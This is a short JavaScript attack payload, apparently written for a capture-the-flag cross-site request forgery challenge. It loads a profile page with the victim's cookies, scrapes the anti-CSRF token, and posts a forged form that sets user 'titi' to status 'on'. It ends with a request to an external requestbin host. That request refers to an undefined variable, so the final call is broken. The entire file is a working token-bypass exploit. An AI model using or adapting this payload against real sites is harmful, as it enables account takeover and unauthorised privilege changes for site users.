//<script language="javascript">

//Part2
function post(token) {
    var username = 'titi',
            status = 'on',
            xhr = new XMLHttpRequest(),
            boundary = '---------------------------' + Math.random().toString().substr(2),
            data = '';

    // Initialize an asynchronous POST request
    xhr.open('POST', '?action=profile', true);

    // Indicate wether or not cross-site access request should be made using credantials (e.g. cookies, authorization headers)
    xhr.withCredentials = true;

    // Set headers
    xhr.setRequestHeader('Content-Type', 'multipart/form-data; charset=UTF-8; boundary=' + boundary);

    // Set data
    data += '--' + boundary;
    data += '\r\nContent-Disposition: form-data; name="username"\r\n\r\n' + username + '\r\n';
    data += '--' + boundary;
    data += '\r\nContent-Disposition: form-data; name="token"\r\n\r\n' + token + '\r\n';
    data += '--' + boundary;
    data += '\r\nContent-Disposition: form-data; name="status"\r\n\r\n' + status + '\r\n';
    data += '--' + boundary + '--';

    // Set additional headers
    xhr.setRequestHeader('Content-Length', data.length);

    xhr.onreadystatechange = function(event) {
        if (this.readyState === XMLHttpRequest.DONE) {
            console.log(this.responseText);
        }
    }

    // Send the request
    xhr.send(data);
}

//Part1
var getXhr = new XMLHttpRequest();

getXhr.open('GET', '?action=profile', true);

// Indicate wether or not cross-site access request should be made using credantials (e.g. cookies, authorization headers)
getXhr.withCredentials = true;

// Send the request
getXhr.send(null);
getXhr.onreadystatechange = function(event) {
    if (this.readyState === XMLHttpRequest.DONE) {
        var exp = new RegExp(".*name=\"token\" value=\"(.*)\" />.*");
        var token = exp.exec(this.responseText)[1];

        post(token)
    }
}

get.open('GET', 'http://requestbin.fullcontact.com/1gv8kzw1', true);

get.send()

//</script>